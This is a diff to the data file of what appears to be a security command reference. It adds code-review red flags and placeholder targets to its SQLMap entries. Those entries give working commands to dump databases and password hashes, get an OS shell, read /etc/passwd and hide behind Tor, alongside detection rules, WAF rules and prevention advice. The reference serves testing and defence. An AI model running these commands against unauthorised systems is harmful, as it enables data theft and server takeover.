+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-basic-scan",
       "name": "SQLMap - Basic GET Scan",
-      "command": "sqlmap -u \"http://target.com/vuln.php?id=1\" --batch",
+      "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" --batch",
       "description": "Runs SQLMap against a GET parameter and tests it for all injection types (boolean, error, union, time, stacked). --batch auto-answers every prompt with the default, so the scan runs unattended.",
       "platform": "linux",
       "requires": [
@@ -66982,14 +70600,15 @@ const COMMAND_DATA = {
         "impact": "Confirmed SQL injection giving full database enumeration capability. Once a technique is confirmed, SQLMap automatically dumps schemas, tables, column names, and data without further manual effort.",
         "detection": "[MITRE T1190] WAF/IDS: High volume of requests to same endpoint with SQL metacharacters. Default User-Agent 'sqlmap/1.x' in access logs — trivially blocked. Burst of 40-150 requests in seconds to a single parameter. DB query log: rapid sequence of malformed/test queries. SIEM: error rate spike from one source IP.",
         "artifacts": "Web server access log: dozens to hundreds of requests with ?id=1' , ?id=1 AND ..., ?id=1 UNION SELECT payloads. SQLMap session files written to ~/.sqlmap/output/target/ — contain confirmed injection data. DB error log: syntax errors from test payloads.",
-        "prevention": "Parameterized queries. WAF with default SQLMap user-agent block rule. Rate limiting (> 20 requests/minute to same endpoint = auto-block). Error pages that reveal no DB information. Regular DAST scanning to find SQLi before attackers do."
+        "prevention": "Parameterized queries. WAF with default SQLMap user-agent block rule. Rate limiting (> 20 requests/minute to same endpoint = auto-block). Error pages that reveal no DB information. Regular DAST scanning to find SQLi before attackers do.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-errors",
       "name": "SQLMap - Debug / Errors",
-      "command": "sqlmap -u \"http://target.com/vuln.php?id=1\" -v 6 --parse-errors --batch",
+      "command": "sqlmap -u \"http://<target>/vuln.php?id=1\" -v 6 --parse-errors --batch",
       "description": "Troubleshoots a scan that is not confirming injection. -v 6 shows full HTTP traffic, --parse-errors surfaces DBMS error messages from responses, and -t /tmp/traffic.txt saves all requests/responses to a file for review.",
       "platform": "linux",
       "requires": [
@@ -67066,14 +70685,15 @@ const COMMAND_DATA = {
         "impact": "Error-based blind injection converts a seemingly non-exploitable injection point into a data extraction channel by reading results from DB error messages — usable even when the application has no normal output for the injected query.",
         "detection": "[MITRE T1190] Responses containing 'XPATH syntax error', 'mysql_fetch_array', or raw DB error messages. Error-based payloads: EXTRACTVALUE(, UPDATEXML( in request parameters. High error rate in application/DB logs.",
         "artifacts": "Application error log: XPATH syntax errors, MySQL syntax errors triggered by payloads. HTTP response bodies (if logged by WAF/proxy): DB error text visible.",
-        "prevention": "**Critical**: disable DB error display in production. PHP: `mysqli_report(MYSQLI_REPORT_OFF)` + custom error handler. Return only generic 'Something went wrong' messages. Error messages should only appear in server-side logs, never in HTTP responses."
+        "prevention": "**Critical**: disable DB error display in production. PHP: `mysqli_report(MYSQLI_REPORT_OFF)` + custom error handler. Return only generic 'Something went wrong' messages. Error messages should only appear in server-side logs, never in HTTP responses.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-passwords",
       "name": "SQLMap - Dump DB User Hashes",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --passwords --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --passwords --batch",
       "description": "Enumerates the database management system's own user accounts and their password hashes (e.g. MySQL's mysql.user). SQLMap offers to run a dictionary attack against the recovered hashes automatically.",
       "platform": "linux",
       "requires": [
@@ -67153,14 +70773,15 @@ const COMMAND_DATA = {
         "impact": "DB administrator credential compromise — cracked DB root/admin passwords enable direct DB access bypassing the application entirely, persistence, and control over the entire DB server.",
         "detection": "[MITRE T1190] DB query log: SELECT FROM mysql.user — only DBA accounts should access this table. App DB user accessing mysql.user is anomalous.",
         "artifacts": "SQLMap output: cracked password hash file. If DB user has DBA, the password dump succeeds silently from the DB's perspective (no permission denied).",
-        "prevention": "App DB account must NOT have access to mysql.user — least-privilege GRANT eliminates this entirely. Strong DB admin passwords resist offline cracking. MySQL: disable mysql.user access for app accounts."
+        "prevention": "App DB account must NOT have access to mysql.user — least-privilege GRANT eliminates this entirely. Strong DB admin passwords resist offline cracking. MySQL: disable mysql.user access for app accounts.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-dump-all",
       "name": "SQLMap - Dump Everything",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --dump-all --exclude-sysdbs --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --dump-all --exclude-sysdbs --batch",
       "description": "Dumps every table in every database, skipping the built-in system schemas with --exclude-sysdbs. --all runs full enumeration (users, privileges, schema, and data) in a single command. Use with care - it is loud and slow.",
       "platform": "linux",
       "requires": [
@@ -67236,14 +70857,15 @@ const COMMAND_DATA = {
         "impact": "Total exfiltration of all user data across all applications on the database server. Catastrophic breach — every user account, session token, business record, and credential stored in any DB on that server.",
         "detection": "[MITRE T1190] Extremely high query volume to the DB from the app connection. Response sizes many times larger than normal application operation. Extended automated session duration. DB query log: systematic enumeration of all schemas then all tables in sequence.",
         "artifacts": "Local dump directory: full CSV files for every table. Network: sustained large-response exfiltration traffic. DB audit log: mass-dump query sequence.",
-        "prevention": "Parameterized queries. DB instance isolation (each application on its own DB server). Even one exploited application should not expose all other applications' data."
+        "prevention": "Parameterized queries. DB instance isolation (each application on its own DB server). Even one exploited application should not expose all other applications' data.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-schema",
       "name": "SQLMap - Dump Full Schema",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --schema --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --schema --batch",
       "description": "Retrieves the entire database structure - every database, table, and column name (no data). A fast way to map the layout before deciding what to dump.",
       "platform": "linux",
       "requires": [
@@ -67319,14 +70941,15 @@ const COMMAND_DATA = {
         "impact": "Full database schema intelligence — attacker knows exactly which table and column contains passwords, SSNs, credit card numbers, or session tokens without guessing or dumping entire tables.",
         "detection": "[MITRE T1190] DB query log: SELECT FROM INFORMATION_SCHEMA.COLUMNS — mass column enumeration, not a normal application query. WAF: INFORMATION_SCHEMA.COLUMNS in request parameters.",
         "artifacts": "SQLMap output: schema map file in the output directory. DB query log: INFORMATION_SCHEMA.COLUMNS queries.",
-        "prevention": "Parameterized queries. INFORMATION_SCHEMA cannot be fully blocked at the SQL user level — DB instance isolation per application is the architectural control."
+        "prevention": "Parameterized queries. INFORMATION_SCHEMA cannot be fully blocked at the SQL user level — DB instance isolation per application is the architectural control.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-dump",
       "name": "SQLMap - Dump Table Data",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --dump -T users -D testdb --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --dump -T users -D testdb --batch",
       "description": "Extracts and saves the contents of a table. SQLMap writes the rows to a CSV under its output directory and auto-cracks any password hashes it recognizes. Add -C to limit columns or --where to filter rows.",
       "platform": "linux",
       "requires": [
@@ -67355,7 +70978,7 @@ const COMMAND_DATA = {
       "variations": [
         {
           "label": "--no-cast (fix empty/corrupted results)",
-          "command": "sqlmap -u \"http://target.com/?id=1\" --dump -T users -D testdb --no-cast --batch"
+          "command": "sqlmap -u \"http://<target>/?id=1\" --dump -T users -D testdb --no-cast --batch"
         }
       ],
       "examples": [
@@ -67425,14 +71048,15 @@ const COMMAND_DATA = {
         "impact": "Complete table data exfiltration — all rows, all columns including passwords, PII, tokens, financial records. Dumped password hashes are automatically attacked with SQLMap's built-in wordlist, often yielding plaintext credentials on first run.",
         "detection": "[MITRE T1190] High response sizes from the vulnerable endpoint (UNION dump returns full table data inline). Time-based: many requests with increasing LIMIT/OFFSET values (blind dump pattern). DB query log: SELECT with LIMIT offset++ sequences from app user.",
         "artifacts": "SQLMap CSV files: ~/.sqlmap/output/target/dump/dbname/tablename.csv — saved locally. Network capture: large responses from the injection endpoint. DB query log: LIMIT/OFFSET enumeration pattern.",
-        "prevention": "Parameterized queries. Encrypt sensitive columns at rest (passwords should be bcrypt/Argon2 hashed — SQLMap's wordlist attack fails on properly hashed passwords). Even with SQLi, proper password hashing limits damage."
+        "prevention": "Parameterized queries. Encrypt sensitive columns at rest (passwords should be bcrypt/Argon2 hashed — SQLMap's wordlist attack fails on properly hashed passwords). Even with SQLi, proper password hashing limits damage.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-tables",
       "name": "SQLMap - Enumerate Tables",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --tables -D testdb --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --tables -D testdb --batch",
       "description": "Lists all tables inside the database named with -D. Use it after --dbs to find where interesting data (users, credentials, flags) lives.",
       "platform": "linux",
       "requires": [
@@ -67507,14 +71131,15 @@ const COMMAND_DATA = {
         "impact": "Complete database schema discovery — reveals sensitive tables (users, passwords, tokens, financial data, PII) before dumping, allowing the attacker to prioritise the highest-value data.",
         "detection": "[MITRE T1190] DB query log: SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='X' — not a normal application query. WAF: INFORMATION_SCHEMA.TABLES in parameters.",
         "artifacts": "SQLMap dump directory: tables list saved per database. DB query log: INFORMATION_SCHEMA.TABLES queries.",
-        "prevention": "Parameterized queries. INFORMATION_SCHEMA access cannot be fully blocked for a user with any table grants — DB isolation at the instance level is the only complete mitigation."
+        "prevention": "Parameterized queries. INFORMATION_SCHEMA access cannot be fully blocked for a user with any table grants — DB isolation at the instance level is the only complete mitigation.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-eval",
       "name": "SQLMap - Evaluate Parameter (--eval)",
-      "command": "sqlmap -u \"http://target.com/?id=1&h=c4ca...\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\" --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1&h=c4ca...\" --eval=\"import hashlib; h=hashlib.md5(id).hexdigest()\" --batch",
       "description": "Runs a Python snippet before each request to recompute dependent parameters. Essential when one parameter is a hash or signature of another - --eval keeps that derived value correct as SQLMap mutates the injected input.",
       "platform": "linux",
       "requires": [
@@ -67591,14 +71216,15 @@ const COMMAND_DATA = {
         "impact": "SQLi exploitation in applications with hash or HMAC-validated parameters — a common anti-automation control in login flows and APIs. --eval makes SQLMap indistinguishable from a legitimate client that correctly computes parameter relationships.",
         "detection": "[MITRE T1190] Correctly computed hash values alongside SQL payloads in the primary parameter — indicates sophisticated tooling. Manually injected SQLi would fail hash validation; automated eval-based SQLi passes.",
         "artifacts": "Access log: h= parameter matches MD5/SHA1 of id parameter for every request including those with SQL payloads.",
-        "prevention": "Hash-paired parameters are an anti-CSRF/anti-automation measure, not a SQLi control. If the hash key/algorithm is known or discoverable, it provides no SQLi protection. Parameterized queries on the injectable parameter are the fix."
+        "prevention": "Hash-paired parameters are an anti-CSRF/anti-automation measure, not a SQLi control. If the hash key/algorithm is known or discoverable, it provides no SQLi protection. Parameterized queries on the injectable parameter are the fix.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-level-risk",
       "name": "SQLMap - Increase Level and Risk",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --level=5 --risk=3 --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --level=5 --risk=3 --batch",
       "description": "Widens how aggressively SQLMap tests. --level (1-5) adds more payloads and more injection points (cookies, headers); --risk (1-3) enables heavier payloads including OR-based and time-based tests that could modify data. Raise these when a default scan finds nothing.",
       "platform": "linux",
       "requires": [
@@ -67674,14 +71300,15 @@ const COMMAND_DATA = {
         "impact": "Deeper test coverage finds subtle injections in non-obvious parameters (HTTP headers, cookies, Referer) that level 1 scans skip. Risk=3 can trigger database modifications during testing — data integrity risk on live systems.",
         "detection": "[MITRE T1190] Risk=3: database modification queries (UPDATE, INSERT) appearing from the web app DB user. Level=5: SQL metacharacters in Referer, User-Agent, X-Forwarded-For headers — unusual for normal users.",
         "artifacts": "DB query log: anomalous UPDATE/INSERT queries from the app user (risk=3). Access log: requests with SQL payloads in header fields.",
-        "prevention": "Never trust any HTTP input: headers, cookies, Referer, User-Agent are all SQL injection vectors if passed to queries. Parameterized queries cover all of these."
+        "prevention": "Never trust any HTTP input: headers, cookies, Referer, User-Agent are all SQL injection vectors if passed to queries. Parameterized queries cover all of these.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-cookie",
       "name": "SQLMap - Inject via Cookie",
-      "command": "sqlmap -u \"http://target.com/\" --cookie=\"id=1*\"",
+      "command": "sqlmap -u \"http://<target>/\" --cookie=\"id=1*\"",
       "description": "Tests a cookie value for SQL injection. Supply the session with --cookie and add a * on the value you want injected. Useful when the vulnerable input arrives in a cookie rather than a URL or form field.",
       "platform": "linux",
       "requires": [
@@ -67756,7 +71383,8 @@ const COMMAND_DATA = {
         "impact": "SQL injection via session cookie — can escalate from authenticated to higher-privileged DB access, dump tables the authenticated user has access to, or pivot to admin accounts via credential dump.",
         "detection": "[MITRE T1190] Cookie value containing SQL metacharacters (%27, UNION, SLEEP). Unusual cookie patterns — most user cookies are opaque tokens, not integers or obvious IDs. High request rate with varying cookie ID values.",
         "artifacts": "Access log: requests with SQL-like cookie values. If cookie is URL-encoded, decoded values visible in WAF logs.",
-        "prevention": "Never use cookie values directly in SQL queries — look up user data by session token from server-side session store, not by reading a DB ID from the cookie."
+        "prevention": "Never use cookie values directly in SQL queries — look up user data by session token from server-side session store, not by reading a DB ID from the cookie.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
@@ -67840,13 +71468,14 @@ const COMMAND_DATA = {
         ],
         "misconfiguration": "Web application logs not monitored for User-Agent anomalies. WAF not deployed or not updated with sqlmap signatures. No rate limiting on query parameters.",
         "vulnerable_config": "# Web server log showing sqlmap User-Agent:\n# 192.168.1.100 - - [01/Aug/2026] 'GET /page.php?id=1 HTTP/1.1' 200 - 'sqlmap/1.7.8#stable (https://sqlmap.org)'\n# → Immediately identifiable as sqlmap scan",
-        "secure_config": "# WAF: block sqlmap User-Agent:\n# ModSecurity:\n# SecRule REQUEST_HEADERS:User-Agent '@contains sqlmap' 'deny,status:403,id:1002'\n\n# Also block common sqlmap patterns:\n# SecRule ARGS '@rx (?i)(union.*select|information_schema|sleep\\(|benchmark\\()' 'deny,status:403,id:1003'\n\n# Rate limiting (nginx):\n# limit_req_zone $binary_remote_addr zone=sqli:10m rate=10r/m;\n# limit_req zone=sqli burst=5 nodelay;"
+        "secure_config": "# WAF: block sqlmap User-Agent:\n# ModSecurity:\n# SecRule REQUEST_HEADERS:User-Agent '@contains sqlmap' 'deny,status:403,id:1002'\n\n# Also block common sqlmap patterns:\n# SecRule ARGS '@rx (?i)(union.*select|information_schema|sleep\\(|benchmark\\()' 'deny,status:403,id:1003'\n\n# Rate limiting (nginx):\n# limit_req_zone $binary_remote_addr zone=sqli:10m rate=10r/m;\n# limit_req zone=sqli burst=5 nodelay;",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       }
     },
     {
       "id": "sqlmap-list-dbs",
       "name": "SQLMap - List Databases",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --dbs --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --dbs --batch",
       "description": "Enumerates all database (schema) names the current user can see. This gives you the -D value needed for deeper table and column enumeration.",
       "platform": "linux",
       "requires": [
@@ -67925,14 +71554,15 @@ const COMMAND_DATA = {
         "impact": "Full database server inventory — attacker sees all databases including those belonging to other applications on the same server. Reveals multi-tenant environments where one SQLi gives access to multiple applications' data.",
         "detection": "[MITRE T1190] DB query log: SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA — no application would normally issue this query. WAF: INFORMATION_SCHEMA in request parameters.",
         "artifacts": "SQLMap output file: list of all DB names. DB query log: INFORMATION_SCHEMA.SCHEMATA access.",
-        "prevention": "Parameterized queries. Even with injection: least-privilege user with GRANT on only the specific application DB still exposes that DB's schema via INFORMATION_SCHEMA (INFORMATION_SCHEMA is readable for granted schemas). True isolation requires separate DB instances per application."
+        "prevention": "Parameterized queries. Even with injection: least-privilege user with GRANT on only the specific application DB still exposes that DB's schema via INFORMATION_SCHEMA (INFORMATION_SCHEMA is readable for granted schemas). True isolation requires separate DB instances per application.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-os-shell",
       "name": "SQLMap - OS Shell",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --os-shell --technique=E",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --os-shell --technique=E",
       "description": "Attempts to drop you into an interactive OS command shell on the database server, automating the webshell upload and execution. --technique=E forces error-based, which is often the most reliable path for the shell. Needs DBA/FILE privileges and a known writable webroot.",
       "platform": "linux",
       "requires": [
@@ -68018,14 +71648,15 @@ const COMMAND_DATA = {
         "impact": "Interactive OS command execution as the web server user — effectively a full shell session from the SQLi vulnerability. Attacker can read/write any file the web server can access, pivot to internal network, install persistence (cron jobs, backdoors), exfiltrate all data, and attempt privilege escalation.",
         "detection": "[MITRE T1190, T1505.003] File system: stager PHP files appearing (tmpXXXXX.php pattern). Web access log: requests to unknown PHP files with cmd= or similar parameter. DB query log: INTO OUTFILE writing PHP content. Network: outbound connections from web server to attacker IP (if reverse shell). UDF: mysql.func table entries for sys_exec, sys_eval.",
         "artifacts": "Webshell files in web root. Web access log: shell command execution requests. DB query log: UDF creation and execution queries. SQLMap session file: OS shell interaction logged.",
-        "prevention": "Revoke FILE privilege + set secure_file_priv. Web root write permissions removed from web server user. Parameterized queries eliminate the injection prerequisite. If somehow reached: application firewall blocking outbound connections from web server process (network egress filtering). File integrity monitoring detects webshell creation."
+        "prevention": "Revoke FILE privilege + set secure_file_priv. Web root write permissions removed from web server user. Parameterized queries eliminate the injection prerequisite. If somehow reached: application firewall blocking outbound connections from web server process (network egress filtering). File integrity monitoring detects webshell creation.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-prefix-suffix",
       "name": "SQLMap - Prefix / Suffix Tuning",
-      "command": "sqlmap -u \"http://target.com/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"",
+      "command": "sqlmap -u \"http://<target>/?q=test\" --prefix=\"%'))\" --suffix=\"-- -\"",
       "description": "Manually sets the string that closes the original query (prefix) and the string that comments out the rest (suffix). Use this when the injection point is wrapped in quotes and parentheses that SQLMap's automatic boundary detection does not break out of.",
       "platform": "linux",
       "requires": [
@@ -68103,14 +71734,15 @@ const COMMAND_DATA = {
         "impact": "Injection in complex query contexts — WHERE clauses with parentheses, HAVING clauses, subqueries. Without prefix/suffix tuning, SQLMap would miss these injections; with it, the same full exploitation is possible.",
         "detection": "[MITRE T1190] Payloads with unusual prefix characters (%')), '))-- in parameters — visible in access logs and WAF.",
         "artifacts": "Access log: parameter values with complex SQL bracket sequences. SQLMap output: custom prefix/suffix stored in session.",
-        "prevention": "Parameterized queries make the surrounding SQL structure irrelevant — the input is never interpreted as syntax regardless of context."
+        "prevention": "Parameterized queries make the surrounding SQL structure irrelevant — the input is never interpreted as syntax regardless of context.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-proxy-tor",
       "name": "SQLMap - Proxy / Tor",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --proxy=\"socks4://177.39.187.70:33283\" --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --proxy=\"socks4://<proxy_ip>:33283\" --batch",
       "description": "Routes all SQLMap traffic through a proxy or the Tor network. Use --proxy for a single proxy, --proxy-file for a rotating list, or --tor with --check-tor to anonymize and confirm the Tor exit is in use.",
       "platform": "linux",
       "requires": [
@@ -68188,14 +71820,15 @@ const COMMAND_DATA = {
         "impact": "IP-based blocking becomes ineffective — the apparent source IP changes per request (Tor exit nodes) or per-scan (proxy rotation). Source attribution for forensic investigation becomes extremely difficult.",
         "detection": "[MITRE T1190] Tor exit node IPs in access logs (known blacklists, e.g., dan.me.uk/torlist). Datacenter IP ranges in access logs (proxy providers). Geographic anomalies: request IP changing countries mid-session. Rate-limiting by IP fails — attacks appear distributed.",
         "artifacts": "Access log: Tor exit node IPs or datacenter IP ranges. Web server: many source IPs for what is behaviourally a single session (same User-Agent, same parameter, different IPs).",
-        "prevention": "IP-based controls are insufficient alone. Detect by behavior (request pattern, payload signatures) not source IP. Tor exit node blocklists provide partial mitigation. Parameterized queries make the source IP irrelevant — injection fails regardless."
+        "prevention": "IP-based controls are insufficient alone. Detect by behavior (request pattern, payload signatures) not source IP. Tor exit node blocklists provide partial mitigation. Parameterized queries make the source IP irrelevant — injection fails regardless.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-randomize",
       "name": "SQLMap - Randomize Parameter",
-      "command": "sqlmap -u \"http://target.com/?id=1&rp=29125\" --randomize=rp --batch",
+      "command": "sqlmap -u \"http://<target>/?id=1&rp=29125\" --randomize=rp --batch",
       "description": "Randomizes the value of a named parameter on every request. Bypasses defenses that require a unique/one-time value (nonce, request id) per submission, which would otherwise reject SQLMap's repeated requests.",
       "platform": "linux",
       "requires": [
@@ -68272,14 +71905,15 @@ const COMMAND_DATA = {
         "impact": "SQLi exploitation in applications with anti-automation tokens (nonces, hash-paired parameters). Without --randomize/--eval these endpoints appear inaccessible to automation; with them they are fully testable.",
         "detection": "[MITRE T1190] Random parameter values changing correctly per-request while the injection parameter varies — indicates automated tool, not browser. Eval-generated hash values computed correctly but SQL payload in the id parameter.",
         "artifacts": "Access log: uid parameter changes every request while id parameter shows SQL payloads. No human generates 200 requests with correctly computed MD5 hashes in 10 seconds.",
-        "prevention": "Hash-paired or randomized parameters provide mild anti-automation friction, not security. Parameterized queries on the id/target parameter are the fix."
+        "prevention": "Hash-paired or randomized parameters provide mild anti-automation friction, not security. Parameterized queries on the id/target parameter are the fix.",
+        "code_review": "RED FLAGS (source): user input concatenated/interpolated into SQL.\n  PHP:    \"...WHERE u='\".$_GET['x'].\"'\"   |  Python: cursor.execute(f\"... {x}\") / % / .format()  |  Node: db.query('...'+req.query.x)\nGREP:  grep -rniE \"(query|execute|prepare)\\(.*(\\$_|req\\.(query|body|params)|f\\\"|%s?\\\"|\\.format)\" .\nSAFE:  parameterized/prepared statements with bound params (?, :name); ORM; least-privilege DB user; no dynamic table/column names from input."
       },
       "type": "command"
     },
     {
       "id": "sqlmap-file-read",
       "name": "SQLMap - Read Server File",
-      "command": "sqlmap -u \"http://target.com/?id=1\" --file-read \"/etc/passwd\"",
+      "command": "sqlmap -u \"http://<target>/?id=1\" --file-read \"/etc/passwd\"",
